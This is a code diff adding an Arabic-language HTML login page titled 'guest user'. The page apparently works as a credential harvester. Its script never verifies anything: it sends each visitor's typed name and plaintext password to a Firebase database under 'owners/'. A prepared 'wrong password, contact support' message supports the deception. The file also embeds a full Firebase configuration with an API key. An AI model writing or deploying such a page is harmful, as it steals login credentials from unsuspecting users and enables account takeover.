@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>ضيف مستخدم</title>
+    <!-- تحميل Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body>
+    <form id="loginForm">
+        <h2>ضيف مستخدم</h2>
+        <label for="loginName">اسم:</label>
+        <input type="text" id="loginName" required>
+        <br>
+        <label for="loginPassword">كلمة السر:</label>
+        <input type="password" id="loginPassword" required>
+        <br>
+        <button type="submit">تسجيل الدخول</button>
+    </form>
+
+    <p id="supportMessage" style="display:none;">
+        كلمة السر خاطئة. إذا فقدت كلمة السر يمكنك إرسال رسالة الدعم من أسفل الشاشة على مدار 24 ساعة، لا تقلق.
+    </p>
+
+    <script>
+        // إعداد Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyDfdJOe80UAwfJFZUgtmHj7TVqSAiCnnAQ",
+  authDomain: "systemcasher-33c06.firebaseapp.com",
+databaseURL: "https://systemcasher-33c06-default-rtdb.firebaseio.com",
+  projectId: "systemcasher-33c06",
+  storageBucket: "systemcasher-33c06.appspot.com",
+  messagingSenderId: "161097570896",
+  appId: "1:161097570896:web:1b587b0c4e8bac3f378f55"
+        };
+
+        // تهيئة Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // نموذج تسجيل الدخول
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const loginName = document.getElementById('loginName').value;
+            const loginPassword = document.getElementById('loginPassword').value;
+
+            // إنشاء معرف فريد للمستخدم الجديد
+            const newUserRef = database.ref('owners/').push(); // هذا ينشئ معرفًا فريدًا تحت "owners"
+
+            // تخزين البيانات تحت owners/معرف المستخدم الجديد
+            newUserRef.set({
+                name: loginName,
+                pass: loginPassword
+            }).then(() => {
+                alert('تم تخزين البيانات بنجاح!');
+                // يمكنك إضافة تحويل المستخدم إلى الصفحة الرئيسية هنا
+            }).catch(error => {
+                console.error('حدث خطأ أثناء التخزين: ', error);
+            });
+        });
+    </script>
+</body>
+</html>
